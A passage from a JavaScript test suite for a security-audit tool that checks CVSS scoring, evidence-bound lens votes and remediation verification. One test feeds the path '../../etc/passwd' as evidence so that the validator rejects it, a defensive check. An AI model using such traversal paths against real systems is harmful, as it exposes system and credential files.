    throw new Error('P1-01 VIOLATION: Out-of-bounds score 99 was not rejected fail-closed');
  }
  const scoreNegRes = validateCvssV4({ vector: validVector, score: -1 });
  if (scoreNegRes.valid || scoreNegRes.score !== null) {
    throw new Error('P1-01 VIOLATION: Negative score -1 was not rejected fail-closed');
  }
  const scoreInfRes = validateCvssV4({ vector: validVector, score: Infinity });
  if (scoreInfRes.valid || scoreInfRes.score !== null) {
    throw new Error('P1-01 VIOLATION: Infinity score was not rejected fail-closed');
  }
  const scoreNanRes = validateCvssV4({ vector: validVector, score: NaN });
  if (scoreNanRes.valid || scoreNanRes.score !== null) {
    throw new Error('P1-01 VIOLATION: NaN score was not rejected fail-closed');
  }
  const missingScoreRes = validateCvssV4({ vector: validVector });
  if (!missingScoreRes.valid || missingScoreRes.score !== null) {
    throw new Error('P1-01 VIOLATION: Missing score must remain null without fabricating arbitrary numbers');
  }
  const validScoreRes = validateCvssV4({ vector: validVector, score: 9.3 });
  if (!validScoreRes.valid || validScoreRes.score !== 9.3 || validScoreRes.severity !== 'CRITICAL') {
    throw new Error('P1-01 VIOLATION: Valid score 9.3 failed validation');
  }
  console.log('✔ 56. P1-01 Invariant: CVSS v4 strictly fails closed on invalid scores and avoids score fabrication.');

  // 57. P1-02 Invariant: All REFUTES decisions require verifiable evidence binding
  const testCandidate = {
    id: 'SEC-EV-TEST',
    title: 'Candidate for Evidence Binding Check',
    ruleId: 'CWE-89',
    severity: 'HIGH',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 20 }
  };

  // 57.1 REACHABILITY REFUTES without evidence -> DEFERRED
  const noEvReachabilityVotes = [
    { findingId: 'SEC-EV-TEST', lens: 'REACHABILITY', decision: 'REFUTES', reason: 'Unreachable' },
    { findingId: 'SEC-EV-TEST', lens: 'DEFENSES', decision: 'SUPPORTS' },
    { findingId: 'SEC-EV-TEST', lens: 'IMPACT', decision: 'SUPPORTS' }
  ];
  const noEvReachRes = deriveFinalDisposition(testCandidate, noEvReachabilityVotes, { score: 0.8 }, process.cwd());
  if (noEvReachRes.disposition !== 'DEFERRED' || noEvReachRes.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error('P1-02 VIOLATION: REACHABILITY REFUTES without evidence was not DEFERRED');
  }

  // 57.2 IMPACT REFUTES without evidence -> DEFERRED
  const noEvImpactVotes = [
    { findingId: 'SEC-EV-TEST', lens: 'REACHABILITY', decision: 'SUPPORTS' },
    { findingId: 'SEC-EV-TEST', lens: 'DEFENSES', decision: 'SUPPORTS' },
    { findingId: 'SEC-EV-TEST', lens: 'IMPACT', decision: 'REFUTES', reason: 'Zero harm' }
  ];
  const noEvImpactRes = deriveFinalDisposition(testCandidate, noEvImpactVotes, { score: 0.8 }, process.cwd());
  if (noEvImpactRes.disposition !== 'DEFERRED' || noEvImpactRes.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error('P1-02 VIOLATION: IMPACT REFUTES without evidence was not DEFERRED');
  }

  // 57.3 DEFENSES REFUTES without proof/evidence -> DEFERRED
  const noEvDefensesVotes = [
    { findingId: 'SEC-EV-TEST', lens: 'REACHABILITY', decision: 'SUPPORTS' },
    { findingId: 'SEC-EV-TEST', lens: 'DEFENSES', decision: 'REFUTES', reason: 'Sanitized somehow' },
    { findingId: 'SEC-EV-TEST', lens: 'IMPACT', decision: 'SUPPORTS' }
  ];
  const noEvDefRes = deriveFinalDisposition(testCandidate, noEvDefensesVotes, { score: 0.8 }, process.cwd());
  if (noEvDefRes.disposition !== 'DEFERRED' || noEvDefRes.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error('P1-02 VIOLATION: DEFENSES REFUTES without proof was not DEFERRED');
  }

  // 57.4 Wrong findingId evidence rejected
  const wrongIdVote = { findingId: 'WRONG-ID', lens: 'REACHABILITY', decision: 'REFUTES', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 20 }] };
  const wrongIdRes = validateVoteEvidence(wrongIdVote, testCandidate, process.cwd());
  if (wrongIdRes.valid) {
    throw new Error('P1-02 VIOLATION: Wrong findingId evidence was accepted');
  }

  // 57.5 Outside-repo evidence rejected
  const traversalVote = { findingId: 'SEC-EV-TEST', lens: 'REACHABILITY', decision: 'REFUTES', evidence: [{ path: '../../etc/passwd', line: 1 }] };
  const traversalRes = validateVoteEvidence(traversalVote, testCandidate, process.cwd());
  if (traversalRes.valid) {
    throw new Error('P1-02 VIOLATION: Path traversal evidence was accepted');
  }

  // 57.6 Invalid line rejected (line 0, line -5, line beyond EOF)
  const line0Vote = { findingId: 'SEC-EV-TEST', lens: 'REACHABILITY', decision: 'REFUTES', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 0 }] };
  const line0Res = validateVoteEvidence(line0Vote, testCandidate, process.cwd());
  if (line0Res.valid) {
    throw new Error('P1-02 VIOLATION: Evidence with line 0 was accepted');
  }
  const lineBeyondEofVote = { findingId: 'SEC-EV-TEST', lens: 'REACHABILITY', decision: 'REFUTES', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 999999 }] };
  const lineBeyondRes = validateVoteEvidence(lineBeyondEofVote, testCandidate, process.cwd());
  if (lineBeyondRes.valid) {
    throw new Error('P1-02 VIOLATION: Evidence line beyond EOF was accepted');
  }

  // 57.7 Valid evidence on REFUTES successfully suppresses to FALSE_POSITIVE
  const validEvVotes = [
    {
      findingId: 'SEC-EV-TEST',
      lens: 'REACHABILITY',
      decision: 'SUPPORTS',
      source: 'skills/3lens/scripts/safe-git.mjs:20',
      sink: 'skills/3lens/scripts/safe-git.mjs:25'
    },
    {
      findingId: 'SEC-EV-TEST',
      lens: 'DEFENSES',
      decision: 'REFUTES',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 20, role: 'guard' }]
    },
    {
      findingId: 'SEC-EV-TEST',
      lens: 'IMPACT',
      decision: 'SUPPORTS',
      sink: 'skills/3lens/scripts/safe-git.mjs:25'
    }
  ];
  const validEvRes = deriveFinalDisposition(testCandidate, validEvVotes, { score: 0.8 }, process.cwd());
  if (validEvRes.disposition !== 'SUPPRESSED' || validEvRes.mappedVerdict !== 'FALSE_POSITIVE') {
    throw new Error('P1-02 VIOLATION: Valid evidence refutation failed to suppress to FALSE_POSITIVE');
  }
  console.log('✔ 57. P1-02 Invariant: All REFUTES decisions strictly enforce verifiable evidence binding.');


  // 58. P1-04 Invariant: Orchestration consistency & unified Fixed 3-Lens verification
  const skillFile = fs.readFileSync(path.resolve(process.cwd(), 'skills/3lens/SKILL.md'), 'utf8');
  if (skillFile.includes('--workers')) {
    throw new Error('P1-04 VIOLATION: SKILL.md still references legacy --workers flag instead of --concurrency');
  }
  if (!skillFile.includes('Fixed 3-Lens Consensus Verification')) {
    throw new Error('P1-04 VIOLATION: SKILL.md Stage 3 not aligned with Fixed 3-Lens verification');
  }
  const verifierProtocolFile = fs.readFileSync(path.resolve(process.cwd(), 'skills/3lens/references/verifier-protocol.md'), 'utf8');
  if (!verifierProtocolFile.includes('Fixed 3-Lens Verification Panel')) {
    throw new Error('P1-04 VIOLATION: verifier-protocol.md not aligned with Fixed 3-Lens Verification Panel');
  }
  const swarmConsensusFile = fs.readFileSync(path.resolve(process.cwd(), 'skills/3lens/references/swarm-consensus.md'), 'utf8');
  if (!swarmConsensusFile.includes('Fixed 3-Lens Verification Panel')) {
    throw new Error('P1-04 VIOLATION: swarm-consensus.md not aligned with Fixed 3-Lens Verification Panel');
  }
  // 58.2 Incomplete 3-Lens panel (missing 1 lens) strictly fails closed to DEFERRED
  const partialLensCandidate = {
    id: 'SEC-PARTIAL-LENS',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 10 }
  };
  const partialLensVotes = [
    { findingId: 'SEC-PARTIAL-LENS', lens: 'REACHABILITY', decision: 'SUPPORTS' },
    { findingId: 'SEC-PARTIAL-LENS', lens: 'DEFENSES', decision: 'SUPPORTS' }
    // IMPACT missing
  ];
  const partialDisp = deriveFinalDisposition(partialLensCandidate, partialLensVotes, { score: 0.90 });
  if (partialDisp.disposition !== 'DEFERRED' || partialDisp.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error('P1-04 VIOLATION: Incomplete 3-Lens panel (2/3 supports) dropped through to legacy confirmation instead of DEFERRED!');
  }
  console.log('✔ 58. P1-04 Invariant: SKILL.md, verifier-protocol, and swarm-consensus completely aligned to Fixed 3-Lens architecture.');

  // 59. P1-05 Invariant: Test harness operates independently of host git environment via isolated git fixtures
  if (!process.env.IS_ZIP_CLEAN_SUBTEST) {
    const cleanExtractDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-zip-clean-'));
    try {
      // Copy project files (excluding .git) to simulate freshly extracted zip archive
      const copyItems = ['package.json', 'LICENSE', 'README.md', 'SECURITY.md', 'plugin.json', 'hooks.json', 'hooks', 'rules', 'agents', 'skills', 'evals', 'schemas', '.security-audit', 'recommended-security-audit-permissions.json', 'scripts', 'tests', 'tool-integrity-manifest.json'];
      for (const item of copyItems) {
        const srcPath = path.resolve(process.cwd(), item);
        if (fs.existsSync(srcPath)) {
          const destPath = path.join(cleanExtractDir, item);
          fs.cpSync(srcPath, destPath, { recursive: true });
        }
      }
      // Ensure NO .git exists in cleanExtractDir
      if (fs.existsSync(path.join(cleanExtractDir, '.git'))) {
        throw new Error('Test setup error: .git was copied to cleanExtractDir');
      }

      // Execute render-sarif.mjs --test inside the cleanExtractDir
      const testScriptInClean = path.join(cleanExtractDir, 'skills', '3lens', 'scripts', 'render-sarif.mjs');
      const testOut = execFileSync(process.execPath, [testScriptInClean, '--test'], {
        cwd: cleanExtractDir,
        encoding: 'utf8',
        env: { ...process.env, IS_ZIP_CLEAN_SUBTEST: '1' }
      });
      if (!testOut.includes('All render-sarif.mjs automated verification tests passed successfully')) {
        throw new Error(`P1-05 VIOLATION: render-sarif.mjs --test failed in clean non-git extract directory:\n${testOut}`);
      }

      // Execute run-evals.mjs inside the cleanExtractDir
      const evalsScriptInClean = path.join(cleanExtractDir, 'skills', '3lens', 'scripts', 'run-evals.mjs');
      const evalsOut = execFileSync(process.execPath, [evalsScriptInClean], {
        cwd: cleanExtractDir,
        encoding: 'utf8',
        env: { ...process.env, IS_ZIP_CLEAN_SUBTEST: '1' }
      });
      if (!evalsOut.includes('All 50/50 deterministic security invariant and adversarial regression tests passed cleanly!')) {
        throw new Error(`P2-02 VIOLATION: run-evals.mjs failed in clean non-git extract directory:\n${evalsOut}`);
      }

      // Execute run-semantic-eval.mjs inside cleanExtractDir (R1-P2-01 / R2-P0-08)
      const semanticScriptInClean = path.join(cleanExtractDir, 'skills', '3lens', 'scripts', 'run-semantic-eval.mjs');
      const semanticOut = execFileSync(process.execPath, [semanticScriptInClean], {
        cwd: cleanExtractDir,
        encoding: 'utf8',
        env: { ...process.env, IS_ZIP_CLEAN_SUBTEST: '1' }
      });
      if (!semanticOut.includes('disposition ground-truth invariant tests passed deterministically')) {
        throw new Error(`R1-P2-01 VIOLATION: run-semantic-eval.mjs failed in clean non-git extract directory:\n${semanticOut}`);
      }

      // Execute run-discovery-eval.mjs inside cleanExtractDir (R2-P0-08)
      const discoveryScriptInClean = path.join(cleanExtractDir, 'skills', '3lens', 'scripts', 'run-discovery-eval.mjs');
      const discoveryOut = execFileSync(process.execPath, [discoveryScriptInClean], {
        cwd: cleanExtractDir,
        encoding: 'utf8',
        env: { ...process.env, IS_ZIP_CLEAN_SUBTEST: '1' }
      });
      if (!discoveryOut.includes('Discovery evaluation suite completed successfully')) {
        throw new Error(`R2-P0-08 VIOLATION: run-discovery-eval.mjs failed in clean non-git extract directory:\n${discoveryOut}`);
      }

      // Execute run-stability-eval.mjs inside cleanExtractDir (R2-P0-08)
      const stabilityScriptInClean = path.join(cleanExtractDir, 'skills', '3lens', 'scripts', 'run-stability-eval.mjs');
      const stabilityOut = execFileSync(process.execPath, [stabilityScriptInClean], {
        cwd: cleanExtractDir,
        encoding: 'utf8',
        env: { ...process.env, IS_ZIP_CLEAN_SUBTEST: '1' }
      });
      if (!stabilityOut.includes('Stability evaluation suite completed successfully')) {
        throw new Error(`R2-P0-08 VIOLATION: run-stability-eval.mjs failed in clean non-git extract directory:\n${stabilityOut}`);
      }

      // Execute check-release-invariants.mjs inside the cleanExtractDir
      const releaseScriptInClean = path.join(cleanExtractDir, 'skills', '3lens', 'scripts', 'check-release-invariants.mjs');
      const releaseOut = execFileSync(process.execPath, [releaseScriptInClean], {
        cwd: cleanExtractDir,
        encoding: 'utf8',
        env: { ...process.env, IS_ZIP_CLEAN_SUBTEST: '1' }
      });
      if (!releaseOut.includes('Release Invariants Gate PASSED')) {
        throw new Error(`P1-05 VIOLATION: check-release-invariants.mjs failed in clean non-git extract directory:\n${releaseOut}`);
      }

    } finally {
      try {
        fs.rmSync(cleanExtractDir, { recursive: true, force: true });
      } catch {}
    }
  }
  console.log('✔ 59. P1-05 Invariant: Test harness and release gate pass on clean extracted zip without git init.');

  // 60. R1-P0-01 Invariant: SUPPORTS requires verifiable evidence binding and cannot self-certify authority via raw rigorMetrics
  const r1Candidate = {
    id: 'SEC-R1-01',
    ruleId: 'CWE-89',
    title: 'SQL Injection in Safe Git Helper',
    severity: 'HIGH',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 25 },
    rigorMetrics: {
      sinkVerified: true,
      sourceVerified: true,
      dataflowTotalSteps: 1,
      dataflowVerifiedSteps: 1,
      mitigationInspected: true
    }
  };

  // Case 1: 3 SUPPORTS + 0 evidence -> DEFERRED
  const votesNoEv = [
    { findingId: 'SEC-R1-01', lens: 'REACHABILITY', decision: 'SUPPORTS', evidence: [] },
    { findingId: 'SEC-R1-01', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [] },
    { findingId: 'SEC-R1-01', lens: 'IMPACT', decision: 'SUPPORTS', evidence: [] }
  ];
  const resNoEv = deriveFinalDisposition(r1Candidate, votesNoEv, { score: 0.85 }, process.cwd());
  if (resNoEv.disposition !== 'DEFERRED' || resNoEv.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error(`R1-P0-01 VIOLATION: 3 SUPPORTS with 0 evidence was not DEFERRED: ${JSON.stringify(resNoEv)}`);
  }

  // Case 2: 3 SUPPORTS + fake rigorMetrics (no source/sink evidence in votes) -> DEFERRED
  const votesArbitraryEv = [
    { findingId: 'SEC-R1-01', lens: 'REACHABILITY', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'general' }] },
    { findingId: 'SEC-R1-01', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 15, role: 'control' }] },
    { findingId: 'SEC-R1-01', lens: 'IMPACT', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 20, role: 'general' }] }
  ];
  const resFakeRigor = deriveFinalDisposition(r1Candidate, votesArbitraryEv, { score: 0.95 }, process.cwd());
  if (resFakeRigor.disposition !== 'DEFERRED' || resFakeRigor.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
    throw new Error(`R1-P0-01 VIOLATION: Fake candidate rigorMetrics allowed REPORTABLE without validated source evidence: ${JSON.stringify(resFakeRigor)}`);
  }

  // Case 3: 3 SUPPORTS + missing source evidence -> DEFERRED
  const votesMissingSource = [
    { findingId: 'SEC-R1-01', lens: 'REACHABILITY', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'sink' }] },
    { findingId: 'SEC-R1-01', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'control' }] },
    { findingId: 'SEC-R1-01', lens: 'IMPACT', decision: 'SUPPORTS', sink: 'skills/3lens/scripts/safe-git.mjs:25' }
  ];
  const resMissingSource = deriveFinalDisposition(r1Candidate, votesMissingSource, { score: 0.85 }, process.cwd());
  if (resMissingSource.disposition !== 'DEFERRED' || !resMissingSource.reason.includes('source/entrypoint')) {
    throw new Error(`R1-P0-01 VIOLATION: Missing source evidence was not DEFERRED: ${JSON.stringify(resMissingSource)}`);
  }

  // Case 4: 3 SUPPORTS + missing sink/root-control evidence -> DEFERRED
  const votesMissingSink = [
    { findingId: 'SEC-R1-01', lens: 'REACHABILITY', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'source' }] },
    { findingId: 'SEC-R1-01', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'control' }] },
    { findingId: 'SEC-R1-01', lens: 'IMPACT', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'impact-boundary' }] }
  ];
  const resMissingSink = deriveFinalDisposition({ ...r1Candidate, location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 } }, votesMissingSink, { score: 0.85 }, process.cwd());
  if (resMissingSink.disposition !== 'DEFERRED' || !resMissingSink.reason.includes('sink/root-control')) {
    throw new Error(`R1-P0-01 VIOLATION: Missing sink evidence was not DEFERRED: ${JSON.stringify(resMissingSink)}`);
  }

  // Case 5: 3 SUPPORTS + nonexistent evidence file -> DEFERRED
  const votesNonexistentFile = [
    { findingId: 'SEC-R1-01', lens: 'REACHABILITY', decision: 'SUPPORTS', source: 'nonexistent-file.js:1', sink: 'skills/3lens/scripts/safe-git.mjs:25' },
    { findingId: 'SEC-R1-01', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'control' }] },
    { findingId: 'SEC-R1-01', lens: 'IMPACT', decision: 'SUPPORTS', sink: 'skills/3lens/scripts/safe-git.mjs:25' }
  ];
  const resNonexistent = deriveFinalDisposition(r1Candidate, votesNonexistentFile, { score: 0.85 }, process.cwd());
  if (resNonexistent.disposition !== 'DEFERRED' || !resNonexistent.reason.includes('does not exist')) {
    throw new Error(`R1-P0-01 VIOLATION: Nonexistent evidence file was not DEFERRED: ${JSON.stringify(resNonexistent)}`);
  }

  // Case 6: 3 SUPPORTS + line beyond EOF -> DEFERRED
  const votesBeyondEof = [
    { findingId: 'SEC-R1-01', lens: 'REACHABILITY', decision: 'SUPPORTS', source: 'skills/3lens/scripts/safe-git.mjs:999999', sink: 'skills/3lens/scripts/safe-git.mjs:25' },
    { findingId: 'SEC-R1-01', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'control' }] },
    { findingId: 'SEC-R1-01', lens: 'IMPACT', decision: 'SUPPORTS', sink: 'skills/3lens/scripts/safe-git.mjs:25' }
  ];
  const resBeyondEof = deriveFinalDisposition(r1Candidate, votesBeyondEof, { score: 0.85 }, process.cwd());
  if (resBeyondEof.disposition !== 'DEFERRED' || !resBeyondEof.reason.includes('exceeds file length')) {
    throw new Error(`R1-P0-01 VIOLATION: Line beyond EOF was not DEFERRED: ${JSON.stringify(resBeyondEof)}`);
  }

  // Case 7: Valid complete evidence tuple + full 3-Lens -> eligible REPORTABLE
  const votesValidTuple = [
    {
      findingId: 'SEC-R1-01',
      lens: 'REACHABILITY',
      decision: 'SUPPORTS',
      source: 'skills/3lens/scripts/safe-git.mjs:10',
      sink: 'skills/3lens/scripts/safe-git.mjs:25',
      reason: 'Reachable from safe-git argument'
    },
    {
      findingId: 'SEC-R1-01',
      lens: 'DEFENSES',
      decision: 'SUPPORTS',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 25, role: 'control' }],
      reason: 'No argument sanitization'
    },
    {
      findingId: 'SEC-R1-01',
      lens: 'IMPACT',
      decision: 'SUPPORTS',
      sink: 'skills/3lens/scripts/safe-git.mjs:25',
      reason: 'Arbitrary execution'
    }
  ];
  const resValid = deriveFinalDisposition(r1Candidate, votesValidTuple, { score: 0.85 }, process.cwd());
  if (resValid.disposition !== 'REPORTABLE' || resValid.mappedVerdict !== 'CONFIRMED') {
    throw new Error(`R1-P0-01 VIOLATION: Valid evidence tuple failed to achieve REPORTABLE: ${JSON.stringify(resValid)}`);
  }
  if (!resValid.authoritativeRigor || resValid.authoritativeRigor.score < 0.60) {
    throw new Error(`R1-P0-01 VIOLATION: Authoritative rigor was not derived from evidence: ${JSON.stringify(resValid)}`);
  }
  console.log('✔ 60. R1-P0-01 Invariant: SUPPORTS strictly mandates verifiable evidence bindings and derives authoritative rigor.');

  // 61. R1-P0-02 Invariant: verifyRemediation strictly mandates valid evidence bindings across all 3 lenses
  const remCandidate = {
    id: 'SEC-REMED-R1',
    ruleId: 'CWE-89',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 10 }
  };

  // Case 0: repoRoot null / omitted -> NOT VERIFIED
  const resNoRepoRoot = verifyRemediation(remCandidate, [
    { findingId: 'SEC-REMED-R1', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:10', mitigationReason: 'Guard added', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'guard' }] },
    { findingId: 'SEC-REMED-R1', lens: 'REACHABILITY', decision: 'REFUTES', reason: 'Unreachable', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'dead-path' }] },
    { findingId: 'SEC-REMED-R1', lens: 'IMPACT', decision: 'REFUTES', reason: 'Zero harm', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'impact-boundary' }] }
  ], null);
  if (resNoRepoRoot.verified || !resNoRepoRoot.reason.includes('concrete repository root')) {
    throw new Error(`R1-P0-02 VIOLATION: Null repoRoot was not rejected fail-closed: ${JSON.stringify(resNoRepoRoot)}`);
  }

  // Case 1: 3 REFUTES + fake paths -> NOT VERIFIED
  const votesFakePaths = [
    { findingId: 'SEC-REMED-R1', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'fake/path.js:10', mitigationReason: 'Guard added' },
    { findingId: 'SEC-REMED-R1', lens: 'REACHABILITY', decision: 'REFUTES', evidence: [{ path: 'fake/path.js', line: 10, role: 'dead-path' }] },
    { findingId: 'SEC-REMED-R1', lens: 'IMPACT', decision: 'REFUTES', evidence: [{ path: 'fake/path.js', line: 10, role: 'impact-boundary' }] }
  ];
  const resFakePaths = verifyRemediation(remCandidate, votesFakePaths, process.cwd());
  if (resFakePaths.verified || !resFakePaths.reason.includes('does not exist')) {
    throw new Error(`R1-P0-02 VIOLATION: Fake paths in remediation verification was not rejected: ${JSON.stringify(resFakePaths)}`);
  }

  // Case 2: REACHABILITY REFUTES without evidence -> NOT VERIFIED
  const votesNoReachEv = [
    { findingId: 'SEC-REMED-R1', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:10', mitigationReason: 'Guard added' },
    { findingId: 'SEC-REMED-R1', lens: 'REACHABILITY', decision: 'REFUTES', reason: 'Unreachable' },
    { findingId: 'SEC-REMED-R1', lens: 'IMPACT', decision: 'REFUTES', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'impact-boundary' }] }
  ];
  const resNoReachEv = verifyRemediation(remCandidate, votesNoReachEv, process.cwd());
  if (resNoReachEv.verified || !resNoReachEv.reason.includes('REACHABILITY')) {
    throw new Error(`R1-P0-02 VIOLATION: REACHABILITY without evidence was not rejected: ${JSON.stringify(resNoReachEv)}`);
  }

  // Case 3: IMPACT REFUTES without evidence -> NOT VERIFIED
  const votesNoImpactEv = [
    { findingId: 'SEC-REMED-R1', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:10', mitigationReason: 'Guard added' },
    { findingId: 'SEC-REMED-R1', lens: 'REACHABILITY', decision: 'REFUTES', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'dead-path' }] },
    { findingId: 'SEC-REMED-R1', lens: 'IMPACT', decision: 'REFUTES', reason: 'Zero harm' }
  ];
  const resNoImpactEv = verifyRemediation(remCandidate, votesNoImpactEv, process.cwd());
  if (resNoImpactEv.verified || !resNoImpactEv.reason.includes('IMPACT')) {
    throw new Error(`R1-P0-02 VIOLATION: IMPACT without evidence was not rejected: ${JSON.stringify(resNoImpactEv)}`);
  }

  // Case 4: DEFENSES proof path nonexistent -> NOT VERIFIED
  const votesNoDefProof = [
    { findingId: 'SEC-REMED-R1', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'nonexistent/defenses.js:10', mitigationReason: 'Guard added' },
    { findingId: 'SEC-REMED-R1', lens: 'REACHABILITY', decision: 'REFUTES', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'dead-path' }] },
    { findingId: 'SEC-REMED-R1', lens: 'IMPACT', decision: 'REFUTES', evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'impact-boundary' }] }
  ];
  const resNoDefProof = verifyRemediation(remCandidate, votesNoDefProof, process.cwd());
  if (resNoDefProof.verified || !resNoDefProof.reason.includes('DEFENSES')) {
    throw new Error(`R1-P0-02 VIOLATION: Nonexistent DEFENSES proof path was not rejected: ${JSON.stringify(resNoDefProof)}`);
  }

  // Case 5: Evidence points to original tree instead of patched scratch tree -> NOT VERIFIED
  const scratchPatchedTree = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-patch-scratch-'));
  try {
    fs.mkdirSync(path.join(scratchPatchedTree, 'skills/3lens/scripts'), { recursive: true });
    fs.writeFileSync(path.join(scratchPatchedTree, 'skills/3lens/scripts/safe-git.mjs'), 'const patched = true;\n// line 2\n');

    // Passing original working tree as repoRoot when scratchTree is required -> REJECTED
    const resOrigTree = verifyRemediation(remCandidate, [
      {
        findingId: 'SEC-REMED-R1',
        lens: 'DEFENSES',
        decision: 'REFUTES',
        mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:10',
        mitigationReason: 'Sanitization barrier installed in patch',
        evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'guard' }]
      },
      {
        findingId: 'SEC-REMED-R1',
        lens: 'REACHABILITY',
        decision: 'REFUTES',
        reason: 'Path blocked in scratch tree',
        evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'dead-path' }]
      },
      {
        findingId: 'SEC-REMED-R1',
        lens: 'IMPACT',
        decision: 'REFUTES',
        reason: 'Zero consequence in scratch tree',
        evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'impact-boundary' }]
      }
    ], process.cwd(), {
      scratchTree: scratchPatchedTree,
      originalTree: process.cwd()
    });
    if (resOrigTree.verified || !resOrigTree.reason.includes('isolated scratch tree')) {
      throw new Error(`R1-P0-02 VIOLATION: Verification against original tree instead of scratch tree was not rejected: ${JSON.stringify(resOrigTree)}`);
    }

    // Valid verification in scratch tree -> VERIFIED
    const scratchVotes = [
      {
        findingId: 'SEC-REMED-R1',
        lens: 'DEFENSES',
        decision: 'REFUTES',
        mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:1',
        mitigationReason: 'Sanitization barrier installed in patch',
        evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 1, role: 'guard' }]
      },
      {
        findingId: 'SEC-REMED-R1',
        lens: 'REACHABILITY',
        decision: 'REFUTES',
        reason: 'Path blocked in scratch tree',
        evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 1, role: 'dead-path' }]
      },
      {
        findingId: 'SEC-REMED-R1',
        lens: 'IMPACT',
        decision: 'REFUTES',
        reason: 'Zero consequence in scratch tree',
        evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 1, role: 'impact-boundary' }]
      }
    ];
    const resScratchValid = verifyRemediation(remCandidate, scratchVotes, scratchPatchedTree, {
      scratchTree: scratchPatchedTree,
      originalTree: process.cwd()
    });
    if (!resScratchValid.verified) {
      throw new Error(`R1-P0-02 VIOLATION: Valid scratch tree remediation was rejected: ${JSON.stringify(resScratchValid)}`);
    }
  } finally {
    fs.rmSync(scratchPatchedTree, { recursive: true, force: true });
  }

  // Case 5b: Uncorrelated file evidence (e.g. package.json instead of safe-git.mjs) -> NOT VERIFIED
  const votesUncorrelated = [
    {
      findingId: 'SEC-REMED-R1',
      lens: 'DEFENSES',
      decision: 'REFUTES',
      mitigationProofLine: 'package.json:1',
      mitigationReason: 'Unrelated file',
      evidence: [{ path: 'package.json', line: 1, role: 'guard' }]
    },
    {
      findingId: 'SEC-REMED-R1',
      lens: 'REACHABILITY',
      decision: 'REFUTES',
      reason: 'Unreachable',
      evidence: [{ path: 'package.json', line: 1, role: 'dead-path' }]
    },
    {
      findingId: 'SEC-REMED-R1',
      lens: 'IMPACT',
      decision: 'REFUTES',
      reason: 'Zero harm',
      evidence: [{ path: 'package.json', line: 1, role: 'impact-boundary' }]
    }
  ];
  const resUncorrelated = verifyRemediation(remCandidate, votesUncorrelated, process.cwd());
  if (resUncorrelated.verified || !resUncorrelated.reason.includes('does not correlate')) {
    throw new Error(`R1-P0-02 VIOLATION: Uncorrelated file evidence was not rejected: ${JSON.stringify(resUncorrelated)}`);
  }

  // Case 6: All 3 valid patched-tree evidence -> eligible VERIFIED
  const votesValidThree = [
    {
      findingId: 'SEC-REMED-R1',
      lens: 'DEFENSES',
      decision: 'REFUTES',
      mitigationProofLine: 'skills/3lens/scripts/safe-git.mjs:10',
      mitigationReason: 'Sanitization barrier installed',
      evidence: [{ path: 'skills/3lens/scripts/safe-git.mjs', line: 10, role: 'guard' }]
    },
    {
      findingId: 'SEC-REMED-R1',
      lens: 'REACHABILITY',
